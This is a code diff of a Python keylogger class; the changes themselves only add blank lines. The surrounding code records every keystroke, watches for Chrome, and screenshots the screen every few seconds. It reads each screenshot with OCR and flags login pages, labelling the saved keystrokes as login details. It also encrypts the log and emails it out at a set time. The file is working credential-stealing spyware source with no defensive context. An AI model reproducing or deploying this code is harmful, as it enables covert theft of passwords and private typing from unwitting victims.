@@ -20,8 +20,11 @@ class KeyLogger():
     '''
     def __init__(self,stopTime):
         self.stopTime = stopTime
+        
         self.count = 0
+        
         self.stopLogging = False
+        
         logging.basicConfig(filename="../LoggedFile.txt",level=logging.DEBUG,format="%(message)s")
 
     '''
@@ -32,8 +35,11 @@ class KeyLogger():
     '''
     def onPress(self, key):
         logging.debug(key)
+        
         if key == keyboard.Key.enter:
+            
             self.stopLogging = True
+            
             # print("Enter  Pressed")
             self.spy()
             #exit(0)
@@ -60,6 +66,7 @@ class KeyLogger():
         while True:
             # Check if chrome.exe is running
             for proc in psutil.process_iter():
+                
                 if proc.name() == "chrome.exe":
                     #print('Chrome Launched')
                     return True
@@ -79,17 +86,21 @@ class KeyLogger():
 
         while True:
             time.sleep(3)
+            
             if (datetime.datetime.now() >= self.stopTime): # If specified time is reached send email of encrypted log file
                 self.sendEmail()
 
             screenshot = ImageGrab.grab()   # Taking screenshot and using pytesseract image_to_string function to read
                                             # the words in the screenshot
             text = pytesseract.image_to_string(screenshot)
+            
             if "Sign in" in text or "Log in" in text:
+                
                 screenshot.save('../captures/potentialLogIn'+str(self.count)+'.png')
                 # print("Detected Image Saved") testing purposes
 
                 data = open("../LoggedFile.txt", "a")
+                
                 data.write("-- LOG IN DETECTED --:\nCheck image potentialLogIn"+str(self.count)+" for website.\n"
                                                                                            "Below is login details.\n")
                 data.write(str(datetime.datetime.now())+" \n")
@@ -106,12 +117,16 @@ class KeyLogger():
         @Return: None
     '''
     def encryptLogFile(self):
+        
         dataFile = open("../data.txt", "r")
+        
         data = dataFile.read()
+        
         key = Fernet.generate_key()
+        
         fn = Fernet(key)
+        
         encryptedData = fn.encrypt(data.encode())
-
         return encryptedData
 
     '''
